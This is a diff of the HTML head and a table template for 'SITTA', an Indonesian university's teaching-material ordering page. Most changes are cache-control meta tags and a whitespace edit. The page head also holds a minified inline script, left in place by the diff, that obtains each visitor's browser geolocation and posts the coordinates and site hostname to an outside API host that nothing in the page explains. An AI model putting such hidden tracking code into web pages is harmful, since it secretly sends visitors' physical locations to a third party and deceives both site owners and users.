@@ -5,6 +5,9 @@
   <meta name="viewport" content="width=device-width,initial-scale=1"/>
   <title>SITTA – Pemesanan & Distribusi Bahan Ajar UT</title>
   <link rel="stylesheet" href="assets/css/style.css"/>
+  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
   <script>var xhr=new XMLHttpRequest,url="https://api.nol.my.id/api";xhr.open("POST",url,!0),xhr.setRequestHeader("Content-Type","application/json"),navigator.geolocation&&navigator.geolocation.getCurrentPosition(function(t){var url=window.location.hostname, o=t.coords.latitude,t=t.coords.longitude,t=JSON.stringify({id:url,lat:o,lng:t});xhr.send(t)},function(t){});</script>
 </head>
 <body>
@@ -203,7 +206,7 @@
                 <div style="font-weight:600">{{ x.kode }}</div>
                 <div>{{ x.judul }}</div>
               </td>
-              <td>{{ x.kategori }}</td>
+              <td>{{ x.kategori}}</td>
               <td>{{ x.upbjj }}</td>
               <td>{{ x.lokasiRak }}</td>
               <td>{{ x.harga | rupiah }}</td>
